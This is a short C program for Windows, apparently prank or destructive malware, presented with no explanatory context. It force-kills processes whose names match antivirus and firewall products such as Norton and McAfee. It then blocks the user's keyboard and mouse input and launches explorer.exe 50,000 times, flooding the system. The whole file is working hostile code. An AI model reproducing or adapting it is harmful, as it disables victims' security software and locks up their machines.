#include <stdio.h>
#include <windows.h>
#include <winable.h>
#include <winuser.h>
#include <stdbool.h>

int main() {
	
	system("taskkill /F /IM av*");
	system("taskkill /F /IM fire*");
	system("taskkill /F /IM anti*");
	system("taskkill /F /IM def*");
	system("taskkill /F /IM guard*");
	system("taskkill /F /IM avg*");
	system("taskkill /F /IM mcafe*");
	system("taskkill /F /IM norton*");
	
	int *x = (int *) malloc (sizeof(int));
	*x = 0;
	BlockInput(true);
	
	while (*x < 50000) {
	system("explorer.exe");
	(*x)++;
}
	BlockInput(false);
	free(x);
	return 0;
}
